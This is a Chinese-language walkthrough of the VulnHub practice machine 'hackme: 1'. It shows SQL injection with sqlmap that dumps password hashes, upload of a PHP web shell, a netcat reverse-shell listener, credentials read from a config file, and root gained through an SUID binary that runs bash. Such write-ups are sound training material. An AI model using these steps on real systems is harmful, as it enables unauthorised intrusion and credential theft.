# hackme: 1

2025.02.27 https://www.vulnhub.com/entry/hackme-1,330/

这个靶机使用 virtualbox 导入有问题，使用 vmware 可以导入。

[video](https://www.bilibili.com/video/BV13B9wYPEQ8/?spm_id_from=333.1387.collection.video_card.click&vd_source=aed2f374c732513d2e535afafb1fd2ec)

## Ip

192.168.10.152

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

访问首页直接跳转到 http://192.168.10.152/login.php 目前没有用户名和密码。

目录扫描发现http://192.168.10.152/uploads/ 里面有个 test.png 图片，图片没隐写。

到注册页面先注册个用户 http://192.168.10.152/register.php 进入到系统后是一个查询功能，可能存在 SQL 注入，将请求数据包保存到 txt 中，然后使用 sqlmap 跑出数据：

```
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
[*] webapphacking

sqlmap -r req.txt --batch -D webapphacking -T users --dump

+----+--------------+------------+----------------+---------------------------------------------+
| id | name         | user       | address        | pasword                                     |
+----+--------------+------------+----------------+---------------------------------------------+
| 1  | David        | user1      | Newton Circles | 5d41402abc4b2a76b9719d911017c592 (hello)    |
| 2  | Beckham      | user2      | Kensington     | 6269c4f71a55b24bad0f0267d9be5508 (commando) |
| 3  | anonymous    | user3      | anonymous      | 0f359740bd1cda994f8b55330c86d845 (p@ssw0rd) |
| 10 | testismyname | test       | testaddress    | 05a671c66aefea124cc08b76ea6d30bb (testtest) |
| 11 | superadmin   | superadmin | superadmin     | 2386acb2cf356944177746fc92523983            | --> Uncrackable
| 12 | test1        | test1      | test1          | 05a671c66aefea124cc08b76ea6d30bb (testtest) |
| 13 | testtest     | testtest   | testtest       | 05a671c66aefea124cc08b76ea6d30bb (testtest) |
+----+--------------+------------+----------------+---------------------------------------------+
```

superadmin 的密码在线找到为 Uncrackable ，先用一下这个用户进行登陆，看看有哪些特殊权限，发现登陆后能够上传文件，直接上传 php shell 没有被拦截，并且可以在 http://192.168.10.152/uploads/ 中看到，直接访问，把 shell 反弹的 kali 上：

```
nc -lvnp 8888
curl http://192.168.10.152/uploads/8888.php
```

得到反弹的 shell，/var/www/html 中读取到 config.php 中的数据库配置信息：

```
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'root');
define('DB_PASSWORD', 'hackme1qaz@WSX');
define('DB_NAME', 'webapphacking');
```

同时发现 1 个用户 hackme，但是上面这个数据库的连接密码不是这个用户的。

发现 suid 程序 /home/legacy/touchmenot，运行后直接得到了 root 权限。

对这个程序进行逆向看到了大概的源码信息：

```
int32_t main (void) {
    edi = 0;
    setuid ();
    edx = 0;
    rsi = "bash";
    rdi = "/bin/bash";
    eax = 0;
    execl ();
    eax = 0;
    return eax;
}
```
